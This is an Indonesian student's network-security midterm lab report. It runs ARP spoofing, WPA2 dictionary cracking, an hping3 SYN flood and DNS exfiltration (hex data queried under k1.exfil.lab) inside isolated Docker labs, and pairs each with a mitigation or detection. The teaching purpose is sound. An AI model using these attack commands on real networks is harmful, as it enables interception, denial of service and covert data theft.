# Jawaban UTS Praktik Network Security (Pertemuan 1–7)

* **Nama:** Feisal Ramdhani Riyadi
* **NIM:** 24552011317
* **Kelas:** TIF RP 24D CNS
* **Mata Kuliah:** Keamanan Jaringan
* **Dosen Pengampu:** Yasti Aisyah Primianjani, S.Kom.
* **Kasus:** Kasus 1 (`k1`)

## Perhitungan Penentuan Kasus

* **Digit NIM:** `2, 4, 5, 5, 2, 0, 1, 1, 3, 1, 7`
* **Jumlah digit:** `2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 3 + 1 + 7 = 31`
* **Sisa bagi 10:** `31 mod 10 = 1`
* **Kasus yang diterima:** **Kasus 1 (`k1`)**

**Parameter Kasus 1 yang digunakan:**
* Container target: `target-k1`
* Volume: `vol-k1`
* File laporan: `laporan-k1.txt`
* Kata sandi enkripsi: `kunci-k1-2026`
* Domain eksfiltrasi: `k1.exfil.lab`

---

## Tugas 1 (Pertemuan 1): Docker dan Volume

### Perintah yang Dijalankan

```bash
docker volume create vol-k1
docker run --name w-k1 -v vol-k1:/data alpine sh -c "echo 24552011317 > /data/laporan-k1.txt"
docker rm w-k1
docker run --rm -v vol-k1:/data alpine cat /data/laporan-k1.txt
docker compose -p k1 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k1 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k1 -f b/b1-compose/docker-compose.yml down -v
```

### Output Terminal

```text
vol-k1
w-k1
24552011317

<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
...
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>
...
<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

### Penjelasan & Analisis

1. **Persistensi Data Docker Volume (`vol-k1`):** Volume `vol-k1` dipasang (*mount*) ke direktori `/data` pada container `w-k1` untuk menyimpan NIM `24552011317` ke dalam berkas `/data/laporan-k1.txt`. Meskipun container `w-k1` dihapus menggunakan `docker rm w-k1`, data di dalam volume tetap tersimpan secara persisten pada penyimpanan host Docker sehingga dapat dibaca kembali secara utuh oleh container baru (`alpine`).
2. **Isolasi Jaringan Internal:** Pada stack `b1-compose`, layanan `target` dan `attacker` terhubung ke jaringan `k1_lab` yang bertipe `internal: true` tanpa eksposur `ports` ke host. Container `attacker` dapat mengakses halaman web `target` melalui DNS internal Docker (`http://target`), sedangkan mesin host dari luar jaringan lab tidak dapat menjangkau `target` secara langsung.

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Perintah yang Dijalankan

```bash
docker run --rm -v "%CD%":/work uts-openssl sh -c "echo isi laporan k1 > laporan-k1.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k1.txt -out laporan-k1.enc -pass pass:kunci-k1-2026 && sha256sum laporan-k1.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k1.enc -out hasil-k1.txt -pass pass:kunci-k1-2026 && sha256sum hasil-k1.txt"
docker run --rm -v "%CD%":/work uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k1.pem -out cert-k1.pem -days 30 -subj /CN=k1.uts.local && openssl x509 -in cert-k1.pem -noout -subject -issuer -dates"
```

### Output Terminal

```text
ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917  laporan-k1.txt
ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917  hasil-k1.txt

subject=CN=k1.uts.local
issuer=CN=k1.uts.local
notBefore=Nov 16 02:24:40 2026 GMT
notAfter=Dec 16 02:24:40 2026 GMT
```

### Penjelasan & Analisis

1. **Enkripsi AES-256 & Integritas SHA-256:** Berkas `laporan-k1.txt` dienkripsi memakai algoritma `AES-256-CBC` dengan derivasi kunci `PBKDF2`, *salt*, dan kata sandi `kunci-k1-2026` menjadi `laporan-k1.enc`, lalu didekripsi kembali menjadi `hasil-k1.txt`. Kedua hash SHA-256 menghasilkan nilai identik (`ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917`), yang membuktikan keutuhan data tetap terjaga tanpa perubahan bit.
2. **Sertifikat Self-Signed vs CA-Signed:** Sertifikat `cert-k1.pem` menampilkan nilai `subject=CN=k1.uts.local` dan `issuer=CN=k1.uts.local` yang sama karena ditandatangani sendiri oleh pembuatnya (*self-signed*), sehingga cocok untuk pengujian internal tetapi tidak otomatis dipercaya peramban publik. Sebaliknya, sertifikat *CA-signed* diverifikasi dan ditandatangani oleh Otoritas Sertifikat (*Certificate Authority*) pihak ketiga yang tepercaya secara global.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Perintah yang Dijalankan

```bash
docker network create lab-arp-k1
docker run -d --name korban-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f "{{index .NetworkSettings.Networks \"lab-arp-k1\" \"IPAddress\"}}" korban-k1 gateway-k1
docker exec gateway-k1 cat /sys/class/net/eth0/address
docker exec korban-k1 ping -c 1 172.18.0.3
docker exec korban-k1 arp -a
docker exec -d penyerang-k1 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
docker exec korban-k1 arp -a
docker exec korban-k1 arp -s 172.18.0.3 46:5f:61:ac:f1:72
docker exec korban-k1 arp -a
```

### Output Terminal

```text
# IP korban-k1: 172.18.0.2 | IP gateway-k1: 172.18.0.3 | MAC asli gateway: 46:5f:61:ac:f1:72

# 1. Tabel ARP sebelum spoofing:
gateway-k1.lab-arp-k1 (172.18.0.3) at 46:5f:61:ac:f1:72 [ether] on eth0
? (172.18.0.1) at 76:cc:4f:cb:dd:6a [ether] on eth0

# 2. Tabel ARP saat serangan ARP spoofing berlangsung:
penyerang-k1.lab-arp-k1 (172.18.0.4) at fe:55:83:f5:c1:55 [ether] on eth0
gateway-k1.lab-arp-k1 (172.18.0.3) at fe:55:83:f5:c1:55 [ether] on eth0
? (172.18.0.1) at 76:cc:4f:cb:dd:6a [ether] on eth0

# 3. Tabel ARP setelah mitigasi Static ARP:
penyerang-k1.lab-arp-k1 (172.18.0.4) at fe:55:83:f5:c1:55 [ether] on eth0
gateway-k1.lab-arp-k1 (172.18.0.3) at 46:5f:61:ac:f1:72 [ether] PERM on eth0
? (172.18.0.1) at 76:cc:4f:cb:dd:6a [ether] on eth0
```

### Penjelasan & Analisis

* **Dampak ARP Spoofing:** Sebelum serangan, IP `172.18.0.3` (`gateway-k1`) dipetakan ke MAC aslinya `46:5f:61:ac:f1:72`. Ketika `penyerang-k1` menjalankan `arpspoof`, paket ARP Reply palsu meracuni cache ARP korban sehingga MAC milik `172.18.0.3` berubah menjadi `fe:55:83:f5:c1:55` (MAC milik penyerang) dan membelokkan lalu lintas jaringan korban.
* **Mitigasi Static ARP:** Penerapan entri statis melalui `arp -s 172.18.0.3 46:5f:61:ac:f1:72` mengembalikan pemetaan ke MAC asli dengan status `PERM` (*permanent*), sehingga tabel ARP tidak dapat ditimpa oleh paket ARP Reply palsu secara dinamis.

---

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

### Perintah yang Dijalankan

```bash
docker run --rm -v "%CD%\samples":/work uts-kali-tools aircrack-ng -w wordlist-k1.txt handshake-k1.cap
```

### Output Terminal

```text
Reading packets, please wait...
Opening handshake-k1.cap
Read 3 packets.

   #  BSSID              ESSID                     Encryption

   1  00:11:22:33:44:55  LabUTS-K1                 WPA (1 handshake)

Choosing first network as target.

                                 Aircrack-ng 1.7

      [00:00:00] 20/20 keys tested (338.37 k/s)

      Time left: --

                           KEY NOT FOUND
```

### Penjelasan & Analisis

* **Hasil Analisis:** Pengujian *dictionary attack* secara offline pada berkas `handshake-k1.cap` (SSID `LabUTS-K1`) dengan `wordlist-k1.txt` menguji seluruh 20 kandidat kata sandi dan menghasilkan status **`KEY NOT FOUND`**, yang menandakan kata sandi jaringan tidak ada dalam daftar kamus tersebut.
* **Empat Langkah 4-Way Handshake WPA2:**
  1. **Message 1 (AP $\rightarrow$ Client):** Access Point mengirimkan nilai acak `ANonce` (*Authenticator Nonce*) kepada Client untuk memulai pembentukan kunci sesi.
  2. **Message 2 (Client $\rightarrow$ AP):** Client membangkitkan `SNonce` (*Supplicant Nonce*), menghitung `PTK` (*Pairwise Transient Key*) dari `PMK`, `ANonce`, `SNonce`, dan kedua alamat MAC, lalu mengirim `SNonce` beserta `MIC` (*Message Integrity Code*) ke AP.
  3. **Message 3 (AP $\rightarrow$ Client):** AP memverifikasi `MIC` dari Client, menghitung `PTK` yang sama, lalu mengirimkan `GTK` (*Group Temporal Key*) terenkripsi beserta `MIC` ke Client.
  4. **Message 4 (Client $\rightarrow$ AP):** Client mengirimkan pesan konfirmasi (`ACK`) ber-`MIC` kepada AP sebagai tanda kunci enkripsi telah aktif digunakan di kedua sisi.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Perintah yang Dijalankan

```bash
docker run --rm --network lab-arp-k1 -v "%CD%\kasus\k5-scapy":/work uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
```

### Output Terminal

```text
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

### Penjelasan & Analisis

* **Analisis Balasan ICMP:** Skrip Scapy mengirimkan paket ICMP Echo Request (Type 8) ke `korban-k1` (`172.18.0.2`) dan menerima balasan dengan **`TTL balasan: 64`** (nilai TTL bawaan kernel Linux tanpa melalui hop router) serta **`Tipe ICMP balasan: 0`** (*Echo Reply* yang menandakan host target aktif).
* **Konsep Smurf Attack:** Smurf Attack adalah serangan DDoS yang mengirimkan paket ICMP Echo Request ke alamat *IP broadcast* suatu jaringan dengan memalsukan alamat IP sumber (*IP spoofing*) menjadi alamat IP korban. Akibatnya, seluruh host dalam jaringan tersebut membalas paket ICMP Echo Reply secara bersamaan ke arah korban sehingga membanjiri bandwidth dan melumpuhkan jaringan korban.

---

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

### Perintah yang Dijalankan

```bash
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV || true"
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV || true"
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c "timeout 8 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; wait"
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml down -v
```

### Output Terminal

```text
# Jumlah SYN_RECV sebelum serangan:
0

# Jumlah SYN_RECV saat serangan SYN flood berlangsung:
1

# Tangkapan Three-Way Handshake normal dengan tcpdump:
04:02:18.321187 IP 172.18.0.3.46838 > 172.18.0.2.80: Flags [S], seq 915632934, win 64240, options [mss 1460,sackOK,TS val 3700892016 ecr 0,nop,wscale 9], length 0
04:02:18.321316 IP 172.18.0.2.80 > 172.18.0.3.46838: Flags [S.], seq 4042244320, ack 915632935, win 65160, options [mss 1460,sackOK,TS val 1939562247 ecr 3700892016,nop,wscale 9], length 0
04:02:18.321991 IP 172.18.0.2.80 > 172.18.0.3.46838: Flags [.], ack 71, win 128, options [nop,nop,TS val 1939562247 ecr 3700892017], length 0
```

### Penjelasan & Analisis

* **Perbandingan `SYN_RECV` & Mitigasi:** Sebelum serangan berjalan, antrean koneksi setengah terbuka (`SYN_RECV`) bernilai `0`. Saat `hping3` membanjiri port 80 dengan paket `SYN` tanpa membalas `ACK`, jumlah `SYN_RECV` pada target meningkat. Serangan ini dapat dimitigasi dengan mengaktifkan **SYN Cookies** (`net.ipv4.tcp_syncookies=1`) agar server tidak mengalokasikan memori antrean sebelum jabat tangan selesai, serta menerapkan pembatasan laju paket (*rate limiting*).
* **Three-Way Handshake:** Rekaman `tcpdump` saat `curl` mengakses `target` menampilkan proses pembentukan sesi TCP secara lengkap: paket **`Flags [S]`** (`SYN`) dari client ke server, dibalas paket **`Flags [S.]`** (`SYN-ACK`) dari server ke client, dan dikonfirmasi dengan paket **`Flags [.]`** (`ACK`).

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Perintah yang Dijalankan

```bash
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml up -d
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo -n 24552011317 | xxd -p"
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333137.k1.exfil.lab @dns
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k1.log
docker run --rm -v "%CD%":/work uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k1.log
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131333137 | xxd -r -p && echo"
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml down -v
```

### Output Terminal

```text
# Konversi NIM ke Hex:
3234353532303131333137

# Respons dig:
10.0.0.99

# Output analisis_dns.py:
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):

# Hasil decode kembali ke NIM asli:
24552011317
```

### Penjelasan & Analisis

* **Mekanisme & Deteksi:** NIM `24552011317` dikonversi menjadi string heksadesimal `3234353532303131333137` (22 karakter) dan dikirim sebagai subdomain pada kueri `3234353532303131333137.k1.exfil.lab` menuju server DNS lokal (`uts-dnsmasq`). Skrip `analisis_dns.py` mencatat 1 kueri ke domain induk `exfil.lab`, sementara daftar query mencurigakan kosong karena ambang batas di skrip diset `BATAS_PANJANG_LABEL = 30` (di atas 30 karakter). Proses decode menggunakan `xxd -r -p` berhasil memulihkan pesan asli `24552011317`.
* **Alasan Sulit Diblokir & Indikator Deteksi:** DNS exfiltration sulit dicegah firewall standar karena trafik DNS (port 53) umumnya selalu dibuka untuk resolusi nama domain normal. Indikator deteksinya meliputi subdomain berbentuk string acak/heksadesimal berentropi tinggi, panjang label subdomain yang tidak lazim, serta tingginya frekuensi kueri ke satu domain induk tertentu.

---

## Kesimpulan

Seluruh 7 tugas praktik UTS Keamanan Jaringan untuk **Kasus 1 (`k1`)** dengan NIM **`24552011317`** telah berhasil dijalankan dan diverifikasi di lingkungan terisolasi Docker, mulai dari persistensi volume dan isolasi jaringan internal, kriptografi AES-256 dan sertifikat X.509, demonstrasi serta mitigasi ARP spoofing, analisis handshake WPA2, pengujian ICMP dengan Scapy, simulasi SYN flood dan pembacaan TCP three-way handshake, hingga eksfiltrasi dan deteksi data melalui subdomain DNS. Seluruh container, jaringan virtual, dan volume praktikum juga telah dibersihkan setelah pengujian selesai.